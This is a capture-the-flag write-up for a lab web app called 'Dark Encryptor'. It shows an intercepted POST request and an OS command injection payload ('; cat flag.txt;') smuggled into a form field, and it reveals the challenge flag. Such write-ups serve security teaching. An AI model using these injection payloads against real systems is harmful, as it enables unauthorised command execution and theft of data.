## Dark Encryptor

> A web app. A POST form. A backend that trusted its users too much.

![Challenge](https://github.com/user-attachments/assets/0b7f102b-c50a-4c42-ba2a-8c0410ef03d4)


---

### Look around

After navigating to the target web server hosted at ```http://10.10.132.71:5000```, I opened Burp Suite and enabled Intercept to capture the form submission request. Here's what I saw:

![Webapp page](https://github.com/user-attachments/assets/01e15f07-adb3-41de-b05c-87ac0734ca7c)


```bash
POST / HTTP/1.1
Host: 10.10.132.71:5000
Content-Length: 44
Cache-Control: max-age=0
Accept-Language: en-GB,en;q=0.9
Origin: http://10.10.132.71:5000
Content-Type: application/x-www-form-urlencoded
Upgrade-Insecure-Requests: 1
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/130.0.6723.70 Safari/537.36
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7
Referer: http://10.10.132.71:5000/
Accept-Encoding: gzip, deflate, br
Connection: keep-alive

text_input=hello%0D%0A&recipient=NullPhantom

```

---

### Testing for Injection

After playing around with BurpeSuite I was able to get a response with ```;ls -a``` just testing the waters, I injected another command to read any file called flag.txt

```bash
text_input=hello; cat flag.txt;&recipient=NullPhantom
```

![BP Command](https://github.com/user-attachments/assets/7f20575d-3c0f-41f5-8c18-f9092a0a1133)

---

### Response
The server responded successfully and embedded the result directly in the HTML response. Nestled in the page was a PGP message block — and right beneath it, a plaintext flag!

![response from BP](https://github.com/user-attachments/assets/c48dacbc-d854-4dfd-a41c-8ad8885916dc)

THM{pgp_cant_stop_me}

---
